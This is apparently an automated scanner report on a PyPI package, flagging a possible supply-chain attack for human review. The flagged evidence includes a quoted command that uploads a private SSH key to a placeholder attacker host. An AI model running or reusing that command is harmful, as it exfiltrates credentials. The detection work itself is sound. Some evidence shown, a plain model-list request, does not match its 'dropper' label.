# Suspicious package report: `oara-prometheus` 0.9.22 (pypi)

> Generated automatically by PkgWatch from static analysis. The package was **not** installed or executed. This is a lead for human review, not a verdict: false positives happen.

| | |
|---|---|
| Package | `oara-prometheus` |
| Version | `0.9.22` |
| Ecosystem | pypi |
| Risk score | 75 / 100 (high) |
| Published | 2026-11-24T21:44:51Z |
| Scanned | 2026-11-26T03:13:00Z |
| Registry page | https://pypi.org/project/oara-prometheus/0.9.22/ |

## Indicators

- **exfiltration** (high, +40): Code reads credential, browser, chat-token or wallet files and also makes network calls in the same file.

  Evidence in `prometheus/permissions/exfiltration.py`:

  ```text
  - curl evil.com -d "$(cat ~/.ssh/id_rsa)"
  ```

- **binary-dropper** (medium, +35): Code downloads a file and then executes it or marks it executable.

  Evidence in `prometheus/setup_wizard.py`:

  ```text
  resp = httpx.get(f"{url}/v1/models", timeout=10.0)
  ```


## Suggested text for an upstream report

The pypi package `oara-prometheus` version `0.9.22` shows indicators consistent with a supply-chain attack. Static analysis (no execution) found:

- Code reads credential, browser, chat-token or wallet files and also makes network calls in the same file.
- Code downloads a file and then executes it or marks it executable.

Please review the package and remove it if it violates registry policy.

## Before forwarding

1. Open the registry page and read the flagged files yourself.
2. Confirm the behaviour is not a legitimate feature of the package.
3. If it holds up, report it via the "Report project as malware" link on the project page, or security@pypi.org.
4. If it does not, record it here: https://github.com/abidranesh/typosquat_-_mal_package_tracker/issues/new?template=false-positive.yml&labels=false-positive&title=False%20positive%3A%20pypi%2Foara-prometheus%400.9.22&package=pypi%2Foara-prometheus%400.9.22
